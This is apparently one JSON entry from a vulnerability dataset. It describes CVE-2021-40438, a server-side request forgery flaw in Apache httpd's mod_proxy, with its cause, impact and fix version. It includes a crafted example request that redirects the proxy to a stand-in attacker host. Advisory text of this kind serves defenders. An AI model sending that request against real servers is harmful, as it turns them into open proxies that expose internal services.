    "desc": "CVE-2021-40438 is a critical Server Side Request Forgery vulnerability in Apache HTTP Server (httpd) 2.4.48 and earlier when the mod_proxy module is enabled. The flaw resides in the URL\u2011parsing code of mod_proxy: it scans the entire supplied request\u2011URI for the string \"unix:\" instead of checking only the prefix. An attacker can craft a request such as `http://victim/?unix:AAAA\u2026|http://attacker:8080/` which causes the vulnerable Apache instance to forward the request to any arbitrary backend server chosen by the attacker. This effectively turns the server into an open proxy, allowing exfiltration of internal resources, spoofing of source IP addresses, facilitating denial\u2011of\u2011service attacks, or enabling further attacks against internal services. The vulnerability is triggered remotely without authentication and requires only that mod_proxy (or any proxy\u2011related sub\u2011module) be compiled and enabled. It was fixed in Apache HTTP Server 2.4.49 and later releases.",
